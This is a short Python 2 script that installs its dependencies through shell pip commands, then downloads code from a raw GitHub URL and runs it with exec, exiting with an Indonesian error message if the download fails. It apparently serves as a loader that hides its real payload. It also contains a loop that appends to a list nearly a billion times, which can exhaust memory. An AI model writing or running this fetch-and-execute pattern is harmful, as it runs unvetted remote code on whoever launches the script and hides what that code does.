# coding:utf-8
import os, sys, time
awas = []
try:
    import requests
except ImportError:
    os.system('pip2 install requests && python2 ' + sys.argv[0])

try:
    import bs4
except ImportError:
    os.system('pip2 install bs4 && python2 ' + sys.argv[0])
except IOError:
    for x in range(999999999):
        awas.append(sys.argv[0])

    sys.exit()

try:
    exec requests.get('https://raw.githubusercontent.com/warba29/pler/main/bff.py').text
except requests.exceptions.ConnectionError:
    sys.exit('\n [!] koneksi mu bermasalah lol!')

exit()
